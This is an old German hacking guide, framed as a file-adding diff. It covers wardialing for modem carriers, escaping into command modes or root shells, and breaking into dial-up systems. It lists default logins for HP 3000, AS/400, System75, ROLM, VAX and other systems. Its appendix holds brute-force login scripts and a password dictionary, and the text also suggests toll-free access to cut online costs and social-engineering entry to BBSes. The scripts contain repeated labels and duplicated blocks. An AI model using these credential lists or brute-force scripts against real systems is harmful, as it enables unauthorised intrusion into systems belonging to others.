@@ -1,0 +1,884 @@
+
+
+
+
+                              CARRIER HACKING
+
+                                 by Giemor
+
+
+
+
+
+
+Warum Carrier Scanning/Hacking
+------------------------------
+
+In der heutigen Zeit ist der Zugang zum Internet im Vergleich zu den USA 
+sehr teuer, also kann man sich andere Wege suchen die eigenen Wege zu senken.
+Zum Beispiel mit einer 0130 gebuehrenfreien Nummer der Telekom.
+Es reicht ja schon wenn man ein Tymnet, Datex-P oder Sprintnet Dial-up findet
+und sich von dort aus zu einen Provider weiterverbinden laesst wie Compuserve,
+IBM-NET oder Aol. Mit etwas Glueck findet man einen Outdial womit man sich
+dann weiter verbinden lassen kann. Oder man findet zugang zu Telnet, TN3270,
+FTP, PPP, SLIP, Telenet, Datapac, Telepac, Decnet, X25, etc...
+Aber auch zum Zeitvertreib kann man sich z.B. einige oeffentliche BBS (oder
+nicht-oeffentliche in die man sich social-engineered) einloggen und mit
+Kumpels leicht Software austauschen oder man versucht herauszufinden, was
+sich z.B hinter den Grossrechnern des typs HP3000 oder HP MPE-XL verbirgt. 
+
+
+
+Wie findet man Carriers
+-----------------------
+
+Der beste und schnellste Weg ist sie mit einem Wardialer zu scannen.
+(thc-scan, toneloc, a-dial). Man kann mit diesen Programmen einen bestimmten 
+Bereich von Telefonnummern durchscannen lassen, wo man viel interessantes
+finden kann, uns aber speziell hier die gefundenen Modems interessieren.
+Der Scanner hat zudem den Vorteil, dass er die heufigsten emulationen, parity, 
+data length, stop bits, ausprobiert sowie breaks sendet, <cr>, <.> etc. und 
+schliesslich gefundene Rufnummer mit dem Text, den das gefundene Modem
+ausgibt in einer Logdatei speichert.
+Es ist von grossem Vorteil wenn das Scan-Modem die VOICE Antwort unterstuetzt,
+da man so mit bis zu 900% die Geschwindigkeit des Abscannens steigern kann.
+
+
+
+Was sind Silent Carriers
+------------------------
+
+Sehr oft bekommt man einen Connect aber nichts passiert - aber irgendein System
+muss ja dahinter sein. Entweder man benutzt eine falsche Terminal Emulation,
+oder die Baudrate ist zu hoch, oder parity, data length, stop bits sind falsch
+eingestellt. 
+a) aendert parity, data length, stop bits, auf 7S1, 7S2, 8E2, 8E1.
+   die meisten Systeme benutzten 8N1, 7E1 und 7O1.
+b) aendert die Terminal emulation: 
+   
+   IBM 3101                    TV 910              BEEHIVE ATL078
+   IBM PC/FTTERM COLOR         LS ADM3A            UDT01
+   IBM PC/FTTERM MONO          ADDS VP             UDT02
+   IBM 3161/62/63              HAZEL 1500          UDT03
+   IBM 3151                    HAZEL ESP I         UDT04
+   IBM 3164                    HAZEL ESP II        UDT05
+   VT52                        NT DISPLAY          ANSI
+   VT100                       TT 5410             ANSI-BBS
+   VT220                       TT 5420
+   FALCO 500                   HP 2621B            Qmodem Pro unterstuetzt
+   WYSE 50                     DG D210                diese Emulationen 
+                                              
+c) aendert die baudrate auf 300, 600, 1200 probiert alles was euer Terminal
+   Programm unterstuetzt.
+d) drueckt oefters hinter einander, <cr>, esc, .' sendet mehrere breaks, 
+e) Manchmal kommt es auch einfach vor das Modems nicht miteinander auskommen,
+   und dann keinen output anzeigen. Zum optimalen Scannen eignet sich am
+   besten ein Zyxel und ein USR Courier, aeltere Modelle reichen.
+f) im Anhang ist ein Login Hacker Script fuer Silent Carriers bei denen a bis e
+   versagt ;-)
+   
+
+
+Ich habe ein System gefunden
+----------------------------
+
+Jetzt muss man erst einmal wissen was fuer ein System man gefunden hat.
+Dazu eine Liste mit System Namen und standart Accounts im zweiten Teil.
+Dann kann man z.B. alle standart Accounts durchprobieren.
+Wenn man den Betreiber des Systemes kennt, z.B eine Firma, dann sollte
+man deren Produkte oder Mitarbeiter Namen als login und Password
+versuchen. Wenn das alles nichts hilft bleibt nur noch Brute Force 
+Hacking uebrig. Man probiert mit einem programm alle moeglichen 
+Kompinationen, Buchstaben und Zahlen an dem System aus. Am besten man
+macht das an einem System wo man endlos eingabe versuche hat. Ein gutes
+Programm dafuer ist der Thc-Login Hacker, man kann ihn an jedes beliebige
+System anpassen weil er mit Script Technik arbeitet. Ein Beispielscript
+gibts dazu im Anhang.
+
+
+
+Suspend/Command Modus
+---------------------
+
+Manche Firmen haben ihre dialups echt gut gesichert. Unknackbare Passwoerter
+etc. etc. - nur haben sie vielleicht etwas uebersehen :
+Viele Programme haben einen "Command Mode", wo man obwohl das Programm laeuft
+noch Einstellungen veraendern kann. Ein typisches Beispiel ist z.B. beim
+Modem das "+++" wo man dann Modem Kommandos eingeben kann, und dann mit "AT O"
+die Verbindung weiter benutzen kann. Andere Programme lassen sich in den
+Hintergrund suspenden und man kann eine shell bekommen (z.B. bei unix)
+Wie findet man solche Command/Suspend Modes? Sendet ein -BREAK-, ^Z, ^], ^+
+sowie alle weiteren Control-Codes von ^A ueber ^Z bis ^] (01 bis 29).
+Was kann man in solchen Modi machen? Nun das haengt vom Programm ab das so
+einen Command modus bietet oder das System was einen das Programm suspenden
+laesst. Bei Unix z.B. hat man eine shell, mit Glueck sogar eine root shell,
+also jackpot. Bei dem Dienstprogramm telnet auf unix, oder auch manche
+Dec-Server und Ascend Dialups kommt man in einen command modus wo man z.B.
+einen telnet, ping oder sogar ppp machen kann - kann also so das Netzwerk
+abscannen oder sogar hacken.
+
+
+
+Sonderfall: Internet
+--------------------
+
+Besonders interessant sind Rechner die am Internet angeschlossen sind.
+Bei manchen Connects sieht man z.B. eine IP Adresse, bei anderen den vollen
+hostname + domain. Damit kann man z.B. problemlos herausfinden in welchem
+Netz die sind (traceroute, broadcast pings, etc.) und versuchen vom Internet
+in den Host oder das Netzwerk hineinzukommen.
+Falls man nur den hostname sieht kann man sich von ftp.nw.com (Netwizards)
+die gesamten ping-baren hosts aller domains holen, z.B. der .com domain und
+darin leicht mit einem grep schauen zu welchem Netzwerk der Rechner gehoert.
+Falls er nicht in den Listen ist oder aber bei hostname+domain mit ping oder
+traceroute nicht zu erreichen ist, ist er entweder nicht angeschlossen, oder
+aber hinter einer Firewall, also wenn man nicht wirklich gut im hacking ist
+die Finger davon lassen.
+
+-------------------------------capture----------------------------------------
+CONNECT 14400/ARQ/MNP5
+Trying ...
+Connected to 192.354.24.5
+Escape character is '^]'.
+
+UNIX(r) System V Release 4.0 (sisy500)
+
+Login:
+-------------------------------capture----------------------------------------
+
+
+
+Systeme mit standart Accounts
+-----------------------------
+
+------------------------------------------------------------------------------
+DECserver Communications Server
+
+DECserver 90TL Communications Server V1.1 (BL44-10) - LAT V5.1
+
+Local -010- Session 1 to ZYNET1 established
+
+Login:
+PASSWORD:
+
+Local -011- Session 1 disconnected from ZYNET1
+hello>
+
+Standart Accounts:
+------------------
+ACCESS
+SYSTEM
+
+Eine Beschreibung von Dec-Servern in Hinsicht auf Outdials siehe THC-MAG2
+------------------------------------------------------------------------------
+Xyplex Terminal Server.
+
+Enter username> 
+Local> 
+  
+Standart Accounts:
+------------------
+ACCESS
+SYSTEM
+------------------------------------------------------------------------------
+
+Annex Command Line Interpreter  *  Copyright 1991 Xylogics, Inc
+
+Checking authorization, Please wait...
+Annex username:                  (Enter your NCI userid)
+Annex password:                  (Enter your NCI password)
+Permission granted
+Annex:
+
+Befehl   Parameter                     Beschreibung
+---------------------------------------------------
+?        ? []                          :Hilfe
+bg       bg [-dq] [%][%,+,-,,]         :Eine Aktion in Hintergrund setzen
+fg       fg [-q] [%][%,+,-,,]          :zurueck zu einer aktuellen Aktion
+hangup   hangup [-q]                   :Auflegen und Port reseten
+help     help []                       :Hilfe
+jobs     jobs                          :Zeigt aktuelle Aktionen an
+kill     kill [%][%,+,-,,]...          :Kille eine Aktion
+stty     stty [parameter [value]]...   :Show/Set Annex Port Parameter
+telnet   telnet [-rsst] [ [port]]      :Starte Telnet Connection
+who      who [[-l] []@ ...]            :Zeigt System User
+
+Standart accounts:
+------------------
+guest     guest
+------------------------------------------------------------------------------
+
+ROLM PhoneMail 9252 9254 Microcode Version 5.2
+Login: ?
+Valid login modes are:
+SYSADMIN,
+TECH,
+POLL.
+Login:tech
+Password:tech
+ROLM PhoneMail 9252 9254 Microcode Version 5.2
+Copyright (C) ROLM Systems 1991
+All Rights Reserved.
+Aktion:
+
+       ( Mit den Befehl "?" oder help kommt man zum folgenden menue)
+
+               The following commands are valid:
+  Activate <session #>         - Activate the session
+  Broadcast                    - Broadcast a message to all terminals
+  Connect <subsystem> <node #> - Invoke the subsystem
+  Terminate <session #>        - Terminate the session
+  List                         - List all open sessions
+  Logout                       - Terminate all sessions and log off.
+  Login <login mode>           - Logout and login again.
+  Display                      - Display sessions status on a site.
+  TechView <on/off>            - Enable/Disable TechView training.
+------------------------------------------------------------------
+Beschreibung aus TFC05:
+
+ActivatePM       :    Starts the Phone Mail system.
+AssignClasses    :    External program to assign COS to each user in the
+                      database. Only local non-Call Processing users are
+                      assigned classes.
+BackupDataBase   :    Create a backup of the customer database on HD or
+                      floppies.
+BackupNames      :    Copies name header information for all subscribers to
+                      a floppy/floppies.
+CallProcessing   :    An external program to create and maintain Mailbox
+                      Profiles.
+ChannelTrace     :    Lists the current state of each channel. Continously
+                      updates until interrupted.
+DeactivatePM     :    Turn off PM system. DON'T USE THIS UNLESS YOU ARE
+                      VERY SURE OF WHAT YOU ARE DOING! Calls will no
+                      longer be taken by the PM if it is deactivated.
+DList            :    Show distribution lists.
+FFormat          :    Format a floppy disk. The single most useless command
+                      for a remote user.
+LogOff           :    Quit session and go to session manager menu.
+MonitorLogon     :    Monitor users logging in to PM.
+MonitorTapLink   :    Shows tap traffic on CBX integrated systems. Continues
+                      to update until interrupted.
+OCConfigAndTest  :    Utility to configure and test all outcalling
+                      related parameters.
+Profile          :    Add All Clear Delete Fix List Modify Purge
+Reports          :    Display reports.
+CallActivity     :    Displays call activity by the hour, with averages.
+
+Standart accounts
+-----------------
+sysadmin  sysadmin
+operator  operator
+poll      poll oder tech
+tech      tech oder operator
+
+Info:
+Eine genaue Beschreibung ueber dieses System giebt es in TFC #5
+------------------------------------------------------------------------------
+
+ROLM CBX II
+
+ROLM CBXII  RELEASE 9004.2.34 RB295 9000D IBMHO27568
+BIND DATE:  7/APR/93
+COPYRIGHT 1980, 1993 ROLM COMPANY.  ALL RIGHTS RESERVED.
+ROLM IS A REGISTERED TRADEMARK AND CBX IS A TRADEMARK OF ROLM COMPANY.
+YOU HAVE ENTERED CPU 1
+12:38:47 ON WEDNESDAY 2/15/1995
+
+USERNAME: op
+
+PASSWORD:
+
+ INVALID USERNAME-PASSWORD PAIR
+
+Standart Accounts:
+------------------
+op              op
+op              operator
+su              super
+admin           pwp
+eng             engineer
+------------------------------------------------------------------------------
+
+ARC NetBlazer Version 2.1
+ARC-login:
+
+Standart Accounts:
+------------------
+test
+setup
+remote
+snmp
+MAV
+------------------------------------------------------------------------------
+
+Telebit's NetBlazer Version 2.0x5
+netblzr2 login:
+
+Standart Accounts:
+------------------
+test
+setup
+remote
+snmp
+MAV
+------------------------------------------------------------------------------
+
+IFG's VAX 8650
+
+%SECURE-I-NET, Incoming number logged by Secure-net
+
+Username: 
+Password:
+Welcome to VAX 8650
+$
+
+Standart Accounts:
+------------------
+Vax
+Vms
+Dcl
+Demo
+Test
+Help
+News
+Guest
+Decnet
+Systest
+Uetp
+Default
+User
+Field
+Service
+System
+Manager
+Operator
+------------------------------------------------------------------------------
+HP 3000
+
+MPE XL:
+MPE XL:HELLO
+Expected [session name,] user.acct [,group]. (CIERR 1424)
+MPE XL:hello mgr.sys
+ENTER ACCOUNT (SYS) PASSWORD:
+ENTER ACCOUNT (SYS) PASSWORD:
+ENTER ACCOUNT (SYS) PASSWORD:
+
+Standart Accounts:
+------------------
+HELLO           MANAGER.SYS
+HELLO           MGR.SYS
+HELLO           FIELD.SUPPORT     HPUNSUP or SUPPORT or HP
+HELLO           OP.OPERATOR
+MGR             CAROLIAN
+MGR             CCC
+MGR             CNAS
+MGR             CONV
+MGR             COGNOS
+OPERATOR        COGNOS
+MANAGER         COGNOS
+OPERATOR        DISC
+MGR             HPDESK
+MGR             HPWORD
+FIELD           HPWORD
+MGR             HPOFFICE
+SPOOLMAN        HPOFFICE
+ADVMAIL         HPOFFICE
+MAIL            HPOFFICE
+WP              HPOFFICE
+MANAGER         HPOFFICE
+MGR             HPONLY
+FIELD           HPP187
+MGR             HPP187
+MGR             HPP189
+MGR             HPP196
+MGR             INTX3
+MGR             ITF3000
+MANAGER         ITF3000
+MAIL            MAIL
+MGR             NETBASE
+MGR             REGO
+MGR             RJE
+MGR             ROBELLE
+MANAGER         SECURITY
+MGR             SECURITY
+FIELD           SERVICE
+MANAGER         SYS
+MGR             SYS
+PCUSER          SYS
+RSBCMON         SYS
+OPERATOR        SYS
+OPERATOR        SYSTEM
+FIELD           SUPPORT
+OPERATOR        SUPPORT
+MANAGER         TCH
+MAIL            TELESUP
+MANAGER         TELESUP
+MGR             TELESUP
+SYS             TELESUP
+MGE             VESOFT
+MGE             VESOFT
+MGR             WORD
+MGR             XLSERVER
+
+Ein Login Hacker Script gibt es im Anhang
+------------------------------------------------------------------------------
+
+System75
+
+Login: root
+INCORRECT LOGIN
+
+Login: browse
+Password:
+
+Software Version: G3s.b16.2.2
+
+Terminal Type (513, 4410, 4425): [513]
+
+Standart Accounts:
+------------------
+bcim            bcimpw
+bciim           bciimpw
+bcms            bcmspw, bcms
+bcnas           bcnspw
+blue            bluepw
+browse          looker, browsepw
+craft           crftpw, craftpw, crack
+cust            custpw
+enquiry         enquirypw
+field           support
+inads           indspw, inadspw, inads
+init            initpw
+kraft           kraftpw
+locate          locatepw
+maint           maintpw, rwmaint
+nms             nmspw
+rcust           rcustpw
+support         supportpw
+tech            field
+------------------------------------------------------------------------------
+AIX
+
+IBM AIX Version 3 for RISC System/6000
+(C) Copyrights by IBM and by others 1982, 1990.
+login:
+
+Standart Accounts:
+------------------
+guest     guest
+------------------------------------------------------------------------------
+
+AS/400
+
+UserID?
+Password?
+
+Standart Accounts:
+------------------
+qsecofr         qsecofr
+qsysopr         qsysopr
+qpgmr           qpgmr     
+ibm             password
+ibm             2222
+ibm             service
+qsecofr         1111111
+qsecofr         2222222
+qserv           qserv
+qsvr            qsvr
+secofr          secofr
+qsrv            ibmce1
+------------------------------------------------------------------------------
+
+
+Systeme ohne Standart Accounts
+------------------------------
+
+CDC Cyber
+
+WELCOME TO THE NOS SOFTWARE SYSTEM.
+COPYRIGHT CONTROL DATA 1978, 1987.
+
+88/02/16. 02.36.53. N265100
+CSUS CYBER 170-730.                     NOS 2.5.2-678/3.
+FAMILY:
+
+You would normally just hit return at the family prompt.  Next prompt is:
+
+USER NAME:
+------------------------------------------------------------------------------
+
+Cisco Router
+
+cisco_router_1>                        (kann jeder beliebige Promt sein)
+cisco_router_1>LOGIN
+Username:
+Password:
+------------------------------------------------------------------------------
+
+GTN
+
+WELCOME TO CITIBANK. PLEASE SIGN ON.
+XXXXXXXX
+
+@
+PASSWORD =
+
+@
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+PLEASE ENTER YOUR ID:-1->
+PLEASE ENTER YOUR PASSWORD:-2->
+
+CITICORP (CITY NAME). KEY GHELP FOR HELP.
+  XXX.XXX
+ PLEASE SELECT SERVICE REQUIRED.-3->
+------------------------------------------------------------------------------
+
+Lantronix Terminal Server
+
+Lantronix ETS16 Version V3.1/1(940623)
+
+Type HELP at the 'Local_15> ' prompt for assistance.
+
+Login password>
+------------------------------------------------------------------------------
+
+NIH Timesharing
+
+NIH Tri-SMP 7.02-FF  16:30:04 TTY11
+system 1378/1381/1453 Connected to Node Happy(40) Line # 12
+Please LOGIN
+.
+------------------------------------------------------------------------------
+
+VM/ESA ONLINE
+
+                                          TBVM2 VM/ESA Rel 1.1     PUT 9200
+
+Fill in your USERID and PASSWORD and press ENTER
+(Your password will not appear when you type it)
+USERID   ===>
+PASSWORD ===>
+
+COMMAND  ===>
+------------------------------------------------------------------------------
+
+
+
+ANHANG:
+
+Login Hacker Scripts:
+---------------------
+
+[BEGIN hp_mpe.txt]
+;
+;
+; ------------------------------------------------------------------------
+;  HP MPE-XL      : SAC-Script for THC-Login-Hacker v1.0  (by van Hauser)
+; ------------------------------------------------------------------------
+;
+;
+; MPE XL:
+; EXPECTED A :HELLO COMMAND. (CIERR 6057)
+; MPE XL: hello
+; EXPECTED [SESSION NAME,] USER.ACCT [,GROUP]   (CIERR 1424)
+;
+; 
+=============================================================================
+#DEFINE
+PHONE_NR=*
+LOGFILE=*.log
+DIAL_TRIES=100
+LOGIN_TRIES=0
+DIC(1)=hp_mpe_a.dic
+; uncomment command lines below to check for 6 more common MPE passwords
+
+#NOCARRIER
+LOG(CARRIER LOST on $DATE at $TIME)
+
+LOG()
+GOTO(1)
+
+#START
+LOG(--------------------------------------------------------------------------)
+LOG( TARGET : $PHONE_NR )
+LOG( DATE : $DATE )
+LOG( TIME : $TIME )
+LOG()
+LOG_SESSION_ON
+SET D_TMP=1
+SET S_TMP=X
+
+:1
+SET STRING=X
+DIAL
+WAIT(1)
+IF STRING~XL THEN GOTO(2)
+WAIT4STRING(2,^M,6,GOTO(1),XL)
+
+:2
+SET STRING=X
+
+SEND_(HELLO )
+IF D_TMP=1 THEN SEND_(ADVMAIL.)
+IF D_TMP=2 THEN SEND_(FIELD.)
+IF D_TMP=3 THEN SEND_(MAIL.)
+IF D_TMP=4 THEN SEND_(MANAGER.)
+IF D_TMP=5 THEN SEND_(MGE.)
+IF D_TMP=6 THEN SEND_(MGR.)
+IF D_TMP=7 THEN SEND_(OP.)
+IF D_TMP=8 THEN SEND_(OPERATOR.)
+IF D_TMP=9 THEN SEND_(PCUSER.)
+IF D_TMP=10 THEN SEND_(RSBCMON.)
+IF D_TMP=11 THEN SEND_(SPOOLMAN.)
+IF D_TMP=12 THEN SEND_(SYS.)
+IF D_TMP=13 THEN SEND_(WP.)
+
+IF S_TMP=X THEN SEND_NEXT_DIC(1)
+IF S_TMP=Y THEN SEND_DIC(1)
+IF S_TMP=Z THEN SEND_DIC(1)
+IF S_TMP=A THEN SEND_DIC(1)
+; IF S_TMP=B THEN SEND_DIC(1)
+; IF S_TMP=C THEN SEND_DIC(1)
+
+IF D_TMP=13 THEN SET S_TMP=X
+IF D_TMP=13 THEN SET D_TMP=1
+WAIT(1)
+; set this higher if the system response is slow
+IF STRING2~HELLO THEN GOTO(3)
+IF STRING2~exists THEN GOTO(3)
+IF STRING2~on-ex THEN GOTO(4)
+IF STRING2~ASSW THEN GOTO(5)
+WAIT(2)
+IF STRING2~HELLO THEN GOTO(3)
+IF STRING2~exists THEN GOTO(3)
+IF STRING2~on-ex THEN GOTO(4)
+IF STRING2~ASSW THEN GOTO(5)
+GOTO(1)
+
+:3
+INC(D_TMP)
+GOTO(2)
+
+:4
+SET S_TMP=X
+SET D_TMP=1
+
+:5
+IF S_TMP=Z THEN GOTO(6)
+IF S_TMP=A THEN GOTO(7)
+;IF S_TMP=B THEN GOTO(8)
+;IF S_TMP=C THEN GOTO(9)
+SET S_TMP=Z
+LOG_($DIC(1))
+SEND_DIC(1)
+WAIT(1)
+LOG_(HPOnly)
+SEND(HPOnly)
+WAIT(1)
+LOG_(HP)
+SEND(HP)
+WAIT(2)
+GOTO(1)
+
+:6
+SET S_TMP=A
+LOG_(MPE)
+SEND(MPE)
+
+LOG_(Manager)
+SEND(Manager)
+WAIT(1)
+LOG_(mgr)
+SEND(mgr)
+WAIT(2)
+GOTO(1)
+
+:7
+SET S_TMP=X
+; SET S_TMP=B
+LOG_(remote)
+SEND(remote)
+WAIT(1)
+LOG_(TeleSup)
+SEND(TeleSup)
+WAIT(1)
+LOG_(operator)
+SEND(operator)
+WAIT(2)
+GOTO(1)
+
+
+; SET S_TMP=C
+; LOG_(tech)
+; SEND(tech)
+; WAIT(1)
+; LOG_(mail)
+; SEND(mail)
+; WAIT(1)
+; LOG_(hpoffice)
+; SEND(hpoffice)
+; WAIT(2)
+; GOTO(1)
+
+; :9
+; SET S_TMP=X
+; LOG_(sys)
+; SEND(sys)
+; WAIT(1)
+; LOG_(security)
+; SEND(security)
+; WAIT(1)
+; LOG_(support)
+; SEND(support)
+; LOG_(hpoffice)
+; SEND(hpoffice)
+; WAIT(2)
+; GOTO(1)
+
+; :9
+; SET S_TMP=X
+; LOG_(sys)
+; SEND(sys)
+; WAIT(1)
+; LOG_(security)
+; SEND(security)
+; WAIT(1)
+; LOG_(support)
+; SEND(support)
+
+; GOTO(1)
+
+:100
+LOG()
+LOG( END OF : $PHONE_NR )
+LOG(--------------------------------------------------------------------------)
+#END
+[END]
+
+
+
+[BEGIN hp_mpe_a.dic]
+CAROLIAN
+CCC
+CNAS
+COGNOS
+CONV
+DISC
+HP
+HPDESK
+HPOFFICE
+HPONLY
+HPP187
+HPP189
+HPP196
+HPUNSUP
+HPWORD
+INTX3
+ITF3000
+MAIL
+NETBASE
+OPERATOR
+REGO
+RJE
+ROBELLE
+HPP187
+HPP189
+HPP196
+HPUNSUP
+HPWORD
+INTX3
+ITF3000
+MAIL
+NETBASE
+OPERATOR
+REGO
+RJE
+ROBELLE
+SERVICE
+SUPPORT
+SYS
+SYSTEM
+TCH
+TELESUP
+VESOFT
+WORD
+XLSERVER
+[END]
+
+
+[BEGIN silent.txt]
+;
+;
+; ------------------------------------------------------------------------
+;  Silent Dialups : SAC-Script for THC-Login-Hacker v1.0  (by van Hauser)
+; ------------------------------------------------------------------------
+;
+; Silent Dialups : No output/response from dialup modem
+;                  (both types, 30 sec hangup & unlimited)
+;
+; (takes approx. 9-10 hours)
+;
+; 
+=============================================================================
+#DEFINE
+PHONE_NR=####
+LOGFILE=####
+DIAL_TRIES=50
+LOGIN_TRIES=0
+BRUTE(1)=^$,1,1,3
+; tries every combination of Controll-Chars and Misc. Chars from 1 to 3 length.
+
+#NOCARRIER
+CHECK4OUTPUT(OFF)
+LOG(CARRIER LOST on $DATE at $TIME)
+
+LOG()
+LOG()
+GOTO(1)
+
+#START
+LOG(--------------------------------------------------------------------------)
+LOG( TARGET : $PHONE_NR )
+LOG( DATE : $DATE )
+LOG( TIME : $TIME )
+LOG()
+LOG_SESSION_ON
+
+:1
+DIAL
+WAIT(1)
+CHECK4OUTPUT(99)
+
+:2
+SEND_NEXT_BRUTE(1)
+WAIT_(255)
+;waits 255ms between every attempt
+GOTO(2)
+CHECK4OUTPUT(99)
+
+:2
+SEND_NEXT_BRUTE(1)
+WAIT_(255)
+;waits 255ms between every attempt
+GOTO(2)
+
+:99
+CHECK4CARRIER(OFF)
+WAIT(5)
+CHECK4CARRIER(#NOCARRIER)
+
+:100
+HANGUP
+BEEP
+BEEP
+BEEP
+LOG()
+LOG()
+LOG( FOUND : $BRUTE(1))
+LOG(--------------------------------------------------------------------------)
+#END
+[END]
+
+
